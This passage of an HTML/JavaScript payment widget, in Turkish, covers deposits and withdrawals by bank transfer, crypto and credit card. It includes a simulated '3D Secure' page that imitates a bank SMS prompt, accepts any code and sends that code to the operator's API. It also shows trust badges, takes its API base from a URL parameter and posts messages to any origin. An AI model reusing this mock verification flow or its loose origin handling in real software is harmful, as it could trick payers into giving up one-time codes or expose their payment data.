style=\"width:100%;border:1.5px solid #e5e7eb;border-radius:8px;padding:10px 12px;font-family:monospace;font-size:15px;outline:none;transition:border-color .15s\"\n              onfocus=\"this.style.borderColor='#2563eb'\" onblur=\"this.style.borderColor='#e5e7eb'\">\n          </div>\n          <div>\n            <label style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:4px\">CVV</label>\n            <input id=\"cc-cvv\" type=\"password\" maxlength=\"4\" placeholder=\"•••\"\n              style=\"width:100%;border:1.5px solid #e5e7eb;border-radius:8px;padding:10px 12px;font-family:monospace;font-size:15px;outline:none;transition:border-color .15s\"\n              onfocus=\"this.style.borderColor='#2563eb'\" onblur=\"this.style.borderColor='#e5e7eb'\">\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <!-- Güvenlik göstergeleri -->\n    <div style=\"display:flex;gap:12px;margin-bottom:16px;align-items:center;justify-content:center\">\n      <div style=\"display:flex;align-items:center;gap:4px;font-size:11px;color:#6b7280\">\n        <span style=\"color:#16a34a\">🔒</span> 256-bit SSL\n      </div>\n      <div style=\"width:1px;height:14px;background:#e5e7eb\"></div>\n      <div style=\"font-size:11px;color:#6b7280\">3D Secure</div>\n      <div style=\"width:1px;height:14px;background:#e5e7eb\"></div>\n      <div style=\"font-size:11px;color:#6b7280\">PCI DSS</div>\n    </div>\n\n    <div class=\"err-msg\" id=\"cc-err\"></div>\n\n    <button class=\"submit-btn\" onclick=\"submitKrediKarti()\" id=\"cc-submit-btn\">\n      <svg viewBox=\"0 0 24 24\" style=\"width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round\"><rect x=\"1\" y=\"4\" width=\"22\" height=\"16\" rx=\"2\"/><path d=\"M1 10h22\"/></svg>\n      ₺<span id=\"cc-amt-display\">0</span> Öde\n    </button>\n    <div style=\"margin-top:.5rem;font-size:11px;color:#9ca3af;text-align:center\">\n      Ödeme güvenli şifreli bağlantı üzerinden yapılır\n    </div>\n  </div>\n</div>\n\n<!-- 3D SECURE MODAL SİMÜLASYONU -->\n<div class=\"page\" id=\"page-cc-3d\">\n  <div class=\"wrap\" style=\"max-width:420px\">\n    <div class=\"page-hd\" style=\"justify-content:center\">\n      <div class=\"page-title\" style=\"font-size:15px\">3D Secure Doğrulama</div>\n    </div>\n    <div class=\"card-box\" style=\"text-align:center\">\n      <div style=\"font-size:32px;margin-bottom:12px\">🏦</div>\n      <div style=\"font-size:14px;font-weight:500;margin-bottom:4px\">Bankanızdan SMS geldi</div>\n      <div style=\"font-size:13px;color:#6b7280;margin-bottom:20px\">+90 5** *** **<span id=\"cc-phone-hint\">12</span> numaralı telefona gönderilen kodu girin</div>\n      <input id=\"cc-3d-code\" type=\"text\" maxlength=\"6\" placeholder=\"______\"\n        style=\"text-align:center;width:160px;border:1.5px solid #e5e7eb;border-radius:8px;padding:12px;font-family:monospace;font-size:22px;letter-spacing:.2em;outline:none;margin-bottom:16px\"\n        onfocus=\"this.style.borderColor='#2563eb'\" onblur=\"this.style.borderColor='#e5e7eb'\">\n      <div style=\"font-size:12px;color:#6b7280;margin-bottom:16px\" id=\"cc-3d-timer\">Kod geçerlilik süresi: <span id=\"cc-3d-countdown\">02:00</span></div>\n      <div class=\"err-msg\" id=\"cc-3d-err\" style=\"margin-bottom:12px\"></div>\n      <button class=\"submit-btn\" onclick=\"confirm3D()\" style=\"max-width:200px;margin:0 auto\">Doğrula</button>\n      <div style=\"margin-top:12px\">\n        <button onclick=\"showPage('kredi')\" style=\"background:none;border:none;color:#6b7280;font-size:12px;cursor:pointer;font-family:inherit\">← Geri Dön</button>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- SUCCESS -->\n<div class=\"page\" id=\"page-suc\">\n  <div class=\"suc-wrap\">\n    <div class=\"suc-icon\"><svg viewBox=\"0 0 24 24\"><path d=\"M20 6L9 17l-5-5\"/></svg></div>\n    <div class=\"suc-title\">Para Yatırma Başarılı!</div>\n    <div class=\"suc-sub\" id=\"suc-sub\"></div>\n    <img id=\"dekont-img\" class=\"dekont-img\" alt=\"Dekont\">\n    <div class=\"dek\" id=\"dek\"></div>\n    <div class=\"suc-btns\">\n      <button class=\"btn-pri\" onclick=\"showPage('home')\">Ana Sayfaya Dön</button>\n      <button class=\"btn-sec\" id=\"dek-dl-btn\">Dekontu İndir (PNG)</button>\n    </div>\n  </div>\n</div>\n\n<script>\n/* ════════════════════════\n   BANK LOGOS\n════════════════════════ */\nconst BANK_LOGOS = {\n  halkbank: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  vakifbank: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  denizbank: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  ziraat: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  isbank: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  garanti: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  akbank: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  yapikredi: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n  kuveytturk: `<img src=\"data:image/png;base64,\" style=\"max-width:120px;max-height:44px;object-fit:contain;display:block\">`,\n};\n\n/* ════════════════════════\n   CONFIG\n════════════════════════ */\nfunction apiBase(){\n  // URL param'a bak (?engine_url=...), yoksa aynı origin'i kullan\n  const urlParam = new URLSearchParams(window.location.search).get('engine_url');\n  if(urlParam) return urlParam.replace(/\\/+$/,'');\n  return window.location.origin;\n}\nconst OPERATOR_IBAN = \"TR33 0006 1005 1978 6457 8413 26\";\n\n/* ════════════════════════\n   MOCK DATA\n════════════════════════ */\nlet TXNS = [\n  {name:'Para Yatırma',time:'3 dk önce',status:'proc',amt:2500},\n  {name:'Para Yatırma',time:'3 dk önce',status:'appr',amt:2500},\n  {name:'Para Yatırma',time:'3 dk önce',status:'proc',amt:2500},\n  {name:'Para Yatırma',time:'4 dk önce',status:'pend',amt:2500},\n  {name:'Para Yatırma',time:'4 dk önce',status:'proc',amt:1000},\n];\nconst BANKS_FB = [\n  {id:'isbank',    name:'İş Bankası',   s:'İ',  c:'#1a3a6b'},\n  {id:'ziraat',    name:'Ziraat Bankası',s:'Z',  c:'#c0392b'},\n  {id:'garanti',   name:'Garanti BBVA', s:'G',  c:'#009966'},\n  {id:'yapikredi', name:'Yapı Kredi',   s:'Y',  c:'#0078d4'},\n  {id:'akbank',    name:'Akbank',       s:'A',  c:'#dc2626'},\n  {id:'halkbank',  name:'Halkbank',     s:'H',  c:'#1a5fa8'},\n  {id:'vakifbank', name:'VakıfBank',    s:'V',  c:'#f5a623'},\n  {id:'denizbank', name:'DenizBank',    s:'D',  c:'#2563eb'},\n  {id:'kuveytturk',name:'Kuveyt Türk',  s:'KT', c:'#006633'},\n];\nlet banks = [...BANKS_FB];\nlet balance = 3500;\n\n/* ════════════════════════\n   DEBUG\n════════════════════════ */\nvar _dbgEntries = [];\nfunction dbgToggle(){\n  var p = document.getElementById('dbg-panel');\n  p.classList.toggle('open');\n  var t = p.querySelector('.dbg-bar-title');\n  t.textContent = p.classList.contains('open') ? '▼ DEBUG' : '▶ DEBUG';\n}\nfunction dbgClear(){\n  _dbgEntries = [];\n  document.getElementById('dbg-body').innerHTML = '';\n  document.getElementById('dbg-count').textContent = '0';\n}\nfunction dbgLog(dir, method, url, statusOrNull, reqBody, resBody){\n  var ts = new Date().toISOString().substr(11,12);\n  var shortUrl = url.replace(apiBase(),'');\n  var isErr = statusOrNull !== null && statusOrNull >= 400;\n  var entryId = 'dbge' + Date.now() + Math.random().toString(36).substr(2,4);\n\n  var hdClass = dir === 'req' ? 'dbg-req' : (isErr ? 'dbg-res-err' : 'dbg-res-ok');\n  var statusHtml = statusOrNull !== null\n    ? '<span class=\"dbg-status '+(isErr?'err':'ok')+'\">'+statusOrNull+'</span>' : '';\n  var bodyStr = '';\n  try{ bodyStr = typeof resBody === 'string' ? resBody : JSON.stringify(reqBody||resBody, null, 2); }catch(e){ bodyStr = String(reqBody||resBody); }\n\n  var html = '<div class=\"dbg-entry\" id=\"'+entryId+'\">'\n    + '<div class=\"dbg-entry-hd '+hdClass+'\" onclick=\"document.getElementById(\\''+entryId+'\\').classList.toggle(\\'expanded\\')\">'\n    + '<span class=\"dbg-method\">'+(dir==='req'?'→ '+method:'← '+method)+'</span>'\n    + '<span class=\"dbg-url\">'+shortUrl+'</span>'\n    + statusHtml\n    + '<span class=\"dbg-ts\">'+ts+'</span>'\n    + '</div>'\n    + '<div class=\"dbg-body-content\">'+escHtml(bodyStr)+'</div>'\n    + '</div>';\n\n  var body = document.getElementById('dbg-body');\n  body.insertAdjacentHTML('afterbegin', html);\n  _dbgEntries.push(entryId);\n  document.getElementById('dbg-count').textContent = _dbgEntries.length;\n}\nfunction escHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }\n\nasync function dbgFetch(url, opts){\n  var method = (opts&&opts.method)||'GET';\n  var reqBody = null;\n  try{ reqBody = opts&&opts.body ? JSON.parse(opts.body) : null; }catch(e){}\n  dbgLog('req', method, url, null, reqBody, null);\n  var r = await fetch(url, opts);\n  var clone = r.clone();\n  var resText = await clone.text();\n  var resBody = null;\n  try{ resBody = JSON.parse(resText); }catch(e){ resBody = resText; }\n  dbgLog('res', method, url, r.status, null, resBody);\n  return r;\n}\n// URL parametrelerinden oku (iframe/embed modunda)\nconst _urlp       = new URLSearchParams(window.location.search);\nconst _urlAmt     = parseFloat(_urlp.get('amount'))     || 0;\nconst _urlMerchant= _urlp.get('merchant_id') || null;\nconst _urlUser    = _urlp.get('user_id')     || null;\nconst _urlPage    = _urlp.get('page')        || null;\nconst _urlMethod  = _urlp.get('method')      || null;\nconst _urlBalance = _urlp.has('balance') ? parseFloat(_urlp.get('balance')) : null;\n\nlet S = {method:_urlMethod||null, amt:_urlAmt||0, bank:null, sessionId:null, dekontB64:null,\n         merchantId:_urlMerchant, userId:_urlUser};\nlet selectedAmt = _urlAmt || 0;\n\n// iframe modunda navbar ve engine bar'ı gizle\nif (_urlPage) {\n  document.documentElement.classList.add('iframe-mode');\n}\n\n// URL'den method + amount gelirse → direkt ödeme adımına atla (seçim sayfasını geç)\nif (_urlMethod && _urlAmt > 0) {\n  document.addEventListener('DOMContentLoaded', () => {\n    S.method = _urlMethod;\n    S.amt    = _urlAmt;\n    selectedAmt = _urlAmt;\n    // Yönteme göre direkt ilgili sayfaya git\n    if      (_urlMethod === 'kripto')       startKripto();\n    else if (_urlMethod === 'havale')       startHavaleManuel();\n    else if (_urlMethod === 'hizli_havale') startHizliHavale();\n    else if (_urlMethod === 'kredi')        showPage('kredi');\n  });\n} else if (_urlPage === 'deposit') {\n  document.addEventListener('DOMContentLoaded', () => showPage('deposit'));\n} else if (_urlPage === 'withdraw') {\n  document.addEventListener('DOMContentLoaded', () => {\n    showPage('withdraw');\n    if(_urlBalance !== null){\n      var el = document.getElementById('wd-balance-info');\n      if(el) el.textContent = 'Kullanılabilir bakiye: ₺' + fmt(_urlBalance) + ' — çekmek istediğiniz tutarı girin.';\n    }\n  });\n}\n\n/* ════════════════════════\n   UTILS\n════════════════════════ */\nfunction fmt(n){return n.toLocaleString('tr-TR',{minimumFractionDigits:2,maximumFractionDigits:2})}\nfunction updateBal(){const t=fmt(balance)+' TRY';document.getElementById('nav-bal').textContent=t;document.getElementById('home-bal').textContent=t}\nfunction statusBadge(s){const m={proc:{c:'b-proc',t:'Processing'},appr:{c:'b-appr',t:'Approved'},pend:{c:'b-pend',t:'Pending'},rej:{c:'b-rej',t:'Rejected'}};const d=m[s]||m.pend;return`<span class=\"badge ${d.c}\">${d.t}</span>`}\nfunction renderTxns(){document.getElementById('txn-list').innerHTML=TXNS.map(t=>`<div class=\"txn-card\"><div class=\"txn-l\"><div class=\"txn-ico\"><svg viewBox=\"0 0 24 24\"><path d=\"M12 19V5M5 12l7 7 7-7\"/></svg></div><div><div class=\"txn-name\">${t.name}</div><div class=\"txn-time\">${t.time}</div></div></div><div class=\"txn-r\">${statusBadge(t.status)}<div class=\"txn-amt\">₺${fmt(t.amt)}</div></div></div>`).join('')}\n\nfunction notifySuccess(txId) {\n  // iframe modunda parent'a bildir — modal KAPATILMAZ, SSE callback bekler\n  if (_urlPage) {\n    try {\n      parent.postMessage({\n        type: 'pp-confirmed',\n        transaction_id: txId,\n        amount: S.amt || 0,\n        method: S.method || 'havale',\n      }, '*');\n    } catch(e) {}\n  }\n}\n\nfunction closeWidget(){\n  try{ parent.postMessage({type:'pp-close'},'*'); }catch(e){}\n}\n\n/* ════════════════════════\n   ÇEKİM\n════════════════════════ */\nfunction pickWdMethod(m){\n  S.wdMethod = m;\n  document.getElementById('wd-amount').value = '';\n  wdClearChips();\n  var title = document.getElementById('wd-amt-title');\n  if(title) title.textContent = m === 'kripto' ? 'Kripto Çekim Tutarı' : 'Çekim Tutarı';\n  showPage('wd-amount');\n}\n\nfunction wdChip(v, el){\n  document.getElementById('wd-amount').value = v;\n  document.querySelectorAll('#wd-chips .amt-opt').forEach(function(b){ b.classList.remove('active'); });\n  el.classList.add('active');\n}\nfunction wdClearChips(){\n  document.querySelectorAll('#wd-chips .amt-opt').forEach(function(b){ b.classList.remove('active'); });\n}\n\nfunction wdAmtNext(){\n  var amt = parseFloat(document.getElementById('wd-amount').value) || 0;\n  var err = document.getElementById('wd-amt-err');\n  err.textContent = '';\n  if(amt < 50){ err.textContent = 'Minimum tutar ₺50 olmalıdır.'; return; }\n  if(_urlBalance !== null && amt > _urlBalance){ err.textContent = 'Bakiyenizi aşıyorsunuz. Mevcut bakiye: ₺'+fmt(_urlBalance); return; }\n  S.wdAmt = amt;\n  if(S.wdMethod === 'kripto'){\n    var el = document.getElementById('wd-kripto-confirm-amt');\n    if(el) el.textContent = '₺' + fmt(amt);\n    S.wdCoin = null;\n    document.querySelectorAll('[id^=\"wdc-\"]').forEach(function(b){ b.classList.remove('sel'); });\n    showPage('wd-kripto');\n  } else {\n    var el = document.getElementById('wd-confirm-amt');\n    if(el) el.textContent = '₺' + fmt(amt);\n    var sub = document.getElementById('wd-details-sub');\n    if(sub) sub.textContent = '₺' + fmt(amt) + ' çekim için hesap bilgilerinizi girin.';\n    showPage('wd-details');\n  }\n}\n\nfunction selectWdCoin(coin){\n  S.wdCoin = coin;\n  document.querySelectorAll('[id^=\"wdc-\"]').forEach(function(b){ b.classList.remove('sel'); });\n  var el = document.getElementById('wdc-'+coin);\n  if(el) el.classList.add('sel');\n}\n\nasync function submitWithdrawKripto(){\n  var coin   = S.wdCoin;\n  var wallet = document.getElementById('wd-wallet').value.trim();\n  var err    = document.getElementById('wd-kripto-err');\n  err.textContent = '';\n  if(!coin)         { err.textContent = 'Coin türü seçiniz.'; return; }\n  if(!wallet)       { err.textContent = 'Cüzdan adresi giriniz.'; return; }\n  await _doWithdraw({ currency: coin, iban: wallet, account_name: coin + ' Withdrawal', err_el: 'wd-kripto-err', btn_sel: '#page-wd-kripto .submit-btn' });\n}\n\nasync function submitWithdraw(){\n  var iban = document.getElementById('wd-iban').value.trim();\n  var name = document.getElementById('wd-name').value.trim();\n  var err  = document.getElementById('wd-err');\n  err.textContent = '';\n  if(!name)             { err.textContent = 'Ad soyad giriniz.'; return; }\n  if(iban.length < 10)  { err.textContent = 'Geçerli bir IBAN giriniz.'; return; }\n  await _doWithdraw({ currency: 'TRY', iban: iban, account_name: name, err_el: 'wd-err', btn_sel: '#page-wd-details .submit-btn' });\n}\n\nasync function _doWithdraw({ currency, iban, account_name, err_el, btn_sel }){\n  var amt = S.wdAmt || 0;\n  var err = document.getElementById(err_el);\n  if(!amt){ if(err) err.textContent = 'Tutar bilgisi eksik.'; return; }\n\n  var btn = btn_sel ? document.querySelector(btn_sel) : null;\n  if(btn){ btn.disabled=true; btn.textContent='Gönderiliyor...'; }\n\n  try{\n    const r = await fetch(apiBase()+'/api/payment/withdrawal', {\n      method: 'POST',\n      headers: {'Content-Type':'application/json'},\n      body: JSON.stringify({\n        merchant_id:  S.merchantId || 'demo',\n        user_id:      S.userId    || 'demo',\n        amount:       amt,\n        currency:     currency,\n        method:       currency === 'TRY' ? 'havale' : 'kripto',\n        iban:         iban,\n        account_name: account_name,\n      })\n    });\n    const d = await r.json();\n    if(!r.ok) throw new Error(d.detail || 'Çekim talebi gönderilemedi.');\n\n    var txId = d.txId || d.transaction_id || ('wd_'+Date.now());\n    try{ parent.postMessage({type:'pp-confirmed', transaction_id:txId, amount:amt, method:'withdraw'}, '*'); }catch(e){}\n    showPage('waiting');\n\n  }catch(e){\n    if(err) err.textContent = e.message;\n    if(btn){ btn.disabled=false; btn.textContent='Çekim Talebi Oluştur'; }\n  }\n}\n\n// Panel'den sonuç mesajı gelince result sayfasını göster\nwindow.addEventListener('message', function(e){\n  if(!e.data || e.data.type !== 'pp-result') return;\n  var ok = e.data.status === 'APPROVED';\n  var icon = document.getElementById('result-icon');\n  var title = document.getElementById('result-title');\n  var sub   = document.getElementById('result-sub');\n  if(ok){\n    icon.style.background = '#e8f5e9';\n    icon.innerHTML = '<svg viewBox=\"0 0 24 24\" style=\"width:36px;height:36px;stroke:#1a7c42;fill:none;stroke-width:2.5\"><path d=\"M20 6L9 17l-5-5\"/></svg>';\n    title.textContent = 'Ödemeniz Onaylandı!';\n    sub.innerHTML = 'Tutarınız hesabınıza yansıtıldı.<br>Teşekkürler.';\n  } else {\n    icon.style.background = '#fef3f2';\n    icon.innerHTML = '<svg viewBox=\"0 0 24 24\" style=\"width:36px;height:36px;stroke:#dc2626;fill:none;stroke-width:2.5\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><line x1=\"15\" y1=\"9\" x2=\"9\" y2=\"15\"/><line x1=\"9\" y1=\"9\" x2=\"15\" y2=\"15\"/></svg>';\n    title.textContent = e.data.status === 'TIMEOUT' ? 'Süre Doldu' : 'İşlem Reddedildi';\n    sub.innerHTML = 'İşleminiz onaylanamadı.<br>Yeniden denemek için kapatınız.';\n  }\n  showPage('result');\n});\n\nfunction showPage(id){\n  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));\n  document.querySelectorAll('.nav-tab').forEach(t=>t.classList.remove('active'));\n  const el = document.getElementById('page-'+id);\n  if(!el){ console.error('showPage: page not found: page-'+id); return; }\n  el.classList.add('active');\n  // Deposit sayfasına dönünce preparing state'ini temizle\n  if(id === 'deposit'){\n    S._preparedSessionId = null;\n    S._preparedCaptcha   = null;\n    S._pendingCaptchaSession = null;\n    prepareBankSession._current = -1;\n  }\n  const m={home:'tab-home',deposit:'tab-dep','dep-amount':'tab-dep',bank:'tab-dep',login:'tab-dep','logging-in':'tab-dep',captcha:'tab-dep',sms:'tab-dep',proc:'tab-dep',suc:'tab-dep',havale:'tab-dep',kripto:'tab-dep',kredi:'tab-dep',waiting:'tab-dep',result:'tab-dep',withdraw:'tab-wd','wd-amount':'tab-wd','wd-details':'tab-wd','wd-kripto':'tab-wd'};\n  const tab=document.getElementById(m[id]);\n  if(tab) tab.classList.add('active');\n  window.scrollTo(0,0);\n}\n\nfunction setBtn(id,loading,txt=''){\n  const b=document.getElementById(id);\n  if(!b) return;\n  b.disabled=loading;\n  if(loading){b.dataset.orig=b.innerHTML;b.innerHTML=`<div class=\"spin-ring\" style=\"border-color:#93c5fd;border-top-color:#fff\"></div> ${txt||'İşleniyor...'}`;}\n  else if(b.dataset.orig) b.innerHTML=b.dataset.orig;\n}\n\nasync function loadBanks(){\n  try{\n    const r=await fetch(apiBase()+'/api/havale/banks');\n    const d=await r.json();\n    if(d.banks && d.banks.length>0){\n      // Engine'den gelen liste — BANKS_FB'deki logo/renk/isim bilgisiyle zenginleştir\n      // Sadece engine'de olan bankalar gösterilir (duplicate yok)\n      banks = d.banks.map(b=>{\n        const fb = BANKS_FB.find(x=>x.id===b.id) || {s:b.name[0],c:'#1a3a6b'};\n        return {...fb, ...b};\n      });\n    } else {\n      // Engine cevap vermezse BANKS_FB'yi kullan\n      banks = [...BANKS_FB];\n    }\n  }catch{\n    banks = [...BANKS_FB];\n  }\n}\n\n/* ════════════════════════\n   DEPOSIT\n════════════════════════ */\n\n\n/* ── KREDİ KARTI ── */\nfunction fmtCcNum(el){\n  let v = el.value.replace(/\\D/g,'').slice(0,16);\n  el.value = v.replace(/(.{4})/g,'$1 ').trim();\n  const disp = v.padEnd(16,'•').replace(/(.{4})/g,'$1 ').trim();\n  document.getElementById('cc-prev-number').textContent = disp;\n}\n\nfunction fmtCcExp(el){\n  let v = el.value.replace(/\\D/g,'').slice(0,4);\n  if(v.length>=3) v = v.slice(0,2)+'/'+v.slice(2);\n  el.value = v;\n  document.getElementById('cc-prev-exp').textContent = v||'••/••';\n}\n\nlet _cc3dTimer = null;\nlet _ccTransactionId = null;\n\nasync function submitKrediKarti(){\n  const num  = document.getElementById('cc-number').value.replace(/\\s/g,'');\n  const name = document.getElementById('cc-name').value.trim();\n  const exp  = document.getElementById('cc-exp').value.trim();\n  const cvv  = document.getElementById('cc-cvv').value.trim();\n  const err  = document.getElementById('cc-err');\n\n  if(num.length < 16){ err.textContent='Geçerli kart numarası girin.'; return; }\n  if(!name)           { err.textContent='Kart üzerindeki adı girin.'; return; }\n  if(exp.length < 5)  { err.textContent='Son kullanma tarihini girin (AA/YY).'; return; }\n  if(cvv.length < 3)  { err.textContent='CVV girin.'; return; }\n  err.textContent = '';\n\n  const btn = document.getElementById('cc-submit-btn');\n  btn.disabled = true;\n  btn.innerHTML = '<span style=\"display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite\"></span> İşleniyor...';\n\n  try {\n    // Panel API'ye kredi kartı işlemi kaydı oluştur\n    const r = await fetch(apiBase()+'/api/payment/account', {\n      method:'POST', headers:{'Content-Type':'application/json'},\n      body: JSON.stringify({\n        merchant_id: S.merchantId||'demo',\n        user_id:     S.userId||'demo',\n        method:      'kredi_karti',\n        bank_id:     'kredi_karti',\n        amount:      S.amt,\n        currency:    'TRY'\n      })\n    });\n    if(r.ok){\n      const d = await r.json();\n      _ccTransactionId = d.transaction_id;\n    }\n  }catch(e){ console.warn('CC transaction:', e); }\n\n  // 3D Secure simülasyonu — 1.5 saniye sonra 3D ekranına geç\n  setTimeout(()=>{\n    btn.disabled = false;\n    btn.innerHTML = `<svg viewBox=\"0 0 24 24\" style=\"width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round\"><rect x=\"1\" y=\"4\" width=\"22\" height=\"16\" rx=\"2\"/><path d=\"M1 10h22\"/></svg> ₺${fmt(S.amt)} Öde`;\n    start3D();\n  }, 1500);\n}\n\nfunction start3D(){\n  document.getElementById('cc-3d-code').value = '';\n  document.getElementById('cc-3d-err').textContent = '';\n  showPage('cc-3d');\n  // Geri sayım başlat\n  let secs = 120;\n  clearInterval(_cc3dTimer);\n  _cc3dTimer = setInterval(()=>{\n    secs--;\n    const m = String(Math.floor(secs/60)).padStart(2,'0');\n    const s2 = String(secs%60).padStart(2,'0');\n    const el = document.getElementById('cc-3d-countdown');\n    if(el) el.textContent = m+':'+s2;\n    if(secs <= 0){\n      clearInterval(_cc3dTimer);\n      const el2 = document.getElementById('cc-3d-err');\n      if(el2) el2.textContent = 'Süre doldu. Lütfen tekrar deneyin.';\n    }\n  }, 1000);\n}\n\nasync function confirm3D(){\n  const code = document.getElementById('cc-3d-code').value.trim();\n  const err  = document.getElementById('cc-3d-err');\n  if(code.length < 4){ err.textContent='Doğrulama kodunu girin.'; return; }\n\n  clearInterval(_cc3dTimer);\n  err.textContent = '';\n\n  // Mock: herhangi bir 4-6 haneli kod kabul et\n  // Gerçek entegrasyonda burada 3DS provider'a istek atılır\n  try{\n    if(_ccTransactionId){\n      await fetch(apiBase()+'/api/payment/confirm', {\n        method:'POST', headers:{'Content-Type':'application/json'},\n        body: JSON.stringify({transaction_id:_ccTransactionId, note:'3DS:'+code})\n      });\n    }\n  }catch(e){}\n\n  showPage('waiting');\n  notifySuccess(_ccTransactionId);\n}\n\n// Kredi kartı sayfasına girilince tutar göster\nfunction initKrediKarti(){\n  document.getElementById('cc-amt-display').textContent = fmt(S.amt);\n  document.getElementById('cc-number').value = '';\n  document.getElementById('cc-name').value = '';\n  document.getElementById('cc-exp').value = '';\n  document.getElementById('cc-cvv').value = '';\n  document.getElementById('cc-prev-number').textContent = '•••• •••• •••• ••••';\n  document.getElementById('cc-prev-name').textContent = 'AD SOYAD';\n  document.getElementById('cc-prev-exp').textContent = '••/••';\n  document.getElementById('cc-err').textContent = '';\n}\n\n/* ── HAVALE MANUEL ── */\n// IBAN formatla: TR330006... → TR33 0006 ...\nfunction fmtIBAN(iban){\n  return (iban||'').replace(/\\s/g,'').replace(/(.{4})/g,'$1 ').trim();\n}\n\n// expiresAt countdown\nlet _havaleCountdown = null;\nlet _havaleAccountPollTimer = null;\n\nfunction _renderHavaleAccount(box, iban, accName, accBank, expiresAt){\n  window._havaleIban = iban;\n  var ibanFmt = fmtIBAN(iban);\n  var nameRow = accName\n    ? '<div style=\"display:flex;justify-content:space-between;align-items:center;gap:8px;padding-bottom:10px;border-bottom:1px solid #f3f4f6\">'\n      + '<span style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;white-space:nowrap\">Ad Soyad</span>'\n      + '<span id=\"havale-accname\" style=\"font-size:13px;font-weight:600;text-align:right\"></span>'\n      + '</div>'\n    : '';\n  var countdownRow = expiresAt\n    ? '<div style=\"display:flex;justify-content:space-between;align-items:center\">'\n      + '<span style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em\">Kalan Süre</span>'\n      + '<span id=\"havale-countdown\" style=\"font-family:monospace;font-size:13px;font-weight:600;color:#f59e0b\">--:--</span>'\n      + '</div>'\n    : '';\n  box.innerHTML = '<div style=\"display:flex;flex-direction:column;gap:12px\">'\n    + nameRow\n    + '<div style=\"display:flex;justify-content:space-between;align-items:center;gap:8px\">'\n      + '<span style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em;white-space:nowrap\">IBAN</span>'\n      + '<div style=\"display:flex;align-items:center;gap:8px;justify-content:flex-end\">'\n        + '<span style=\"font-family:monospace;font-size:12px;font-weight:600\">' + ibanFmt + '</span>'\n        + '<button id=\"iban-copy-btn\" style=\"border:1px solid #e5e7eb;border-radius:6px;padding:3px 10px;font-size:11px;cursor:pointer;background:#f9fafb;white-space:nowrap\">Kopyala</button>'\n      + '</div>'\n    + '</div>'\n    + '<div style=\"display:flex;justify-content:space-between;border-top:1px solid #f3f4f6;padding-top:12px;margin-top:4px\">'\n      + '<span style=\"font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.05em\">Tutar</span>'\n      + '<span style=\"font-size:16px;font-weight:700;color:#2563eb\">₺' + fmt(S.amt) + '</span>'\n    + '</div>'\n    + countdownRow\n    + '</div>';\n  if(accName){\n    var elName = document.getElementById('havale-accname');\n    if(elName) elName.textContent = accName + (accBank ? ' — ' + accBank : '');\n  }\n  var copyBtn = document.getElementById('iban-copy-btn');\n  if(copyBtn){\n    copyBtn.addEventListener('click', function(){\n      var btn = this;\n      function onOk(){ btn.textContent='✓'; setTimeout(function(){ btn.textContent='Kopyala'; },2000); }\n      function onFail(){\n        var ta = document.createElement('textarea');\n        ta.value = window._havaleIban;\n        ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0';\n        document.body.appendChild(ta); ta.focus(); ta.select();\n        try{ document.execCommand('copy') ? onOk() : (btn.textContent='!'); }catch(ex){ btn.textContent='!'; }\n        document.body.removeChild(ta);\n      }\n      if(navigator.clipboard && navigator.clipboard.writeText){\n        navigator.clipboard.writeText(window._havaleIban).then(onOk).catch(onFail);\n      } else { onFail(); }\n    });\n  }\n  if(expiresAt) startHavaleCountdown(expiresAt);\n  document.getElementById('havale-actions').style.display = 'block';\n}\n\nfunction _pollForHavaleAccount(txId, box){\n  var started = Date.now();\n  _havaleAccountPollTimer = setInterval(async function(){\n    if(Date.now() - started > 120000){\n      clearInterval(_havaleAccountPollTimer);\n      box.innerHTML = '<div style=\"color:#dc2626;font-size:13px;text-align:center;padding:16px\">Hesap ataması zaman aşımına uğradı. Lütfen tekrar deneyin.</div>';\n      return;\n    }\n    try{\n      var r = await fetch(apiBase()+'/api/payment/status/'+txId);\n      if(!r.ok) return;\n      var tx = await r.json();\n      var iban = tx.ibanWallet || '';\n      if(iban){\n        clearInterval(_havaleAccountPollTimer);\n        _renderHavaleAccount(box, iban, tx.accountName || '', tx.bank || '', tx.expiresAt || '');\n      }\n    }catch(e){}\n  }, 3000);\n}\n\nfunction startHavaleCountdown(expiresAt, elId){\n  clearInterval(_havaleCountdown);\n  const el = document.getElementById(elId || 'havale-countdown');\n  if(!el || !expiresAt) return;\n  function tick(){\n    const secs = Math.max(0, Math.floor((new Date(expiresAt) - Date.now()) / 1000));\n    const m = String(Math.floor(secs/60)).padStart(2,'0');\n    const s = String(secs%60).padStart(2,'0');\n    if(el) el.textContent = `${m}:${s}`;\n    if(secs <= 0){\n      clearInterval(_havaleCountdown);\n      if(el) el.textContent = 'Süre doldu';\n      if(el) el.style.color = '#dc2626';\n    }\n  }\n  tick();\n  _havaleCountdown = setInterval(tick, 1000);\n}\n\nasync function startHavaleManuel(){\n  showPage('havale');\n  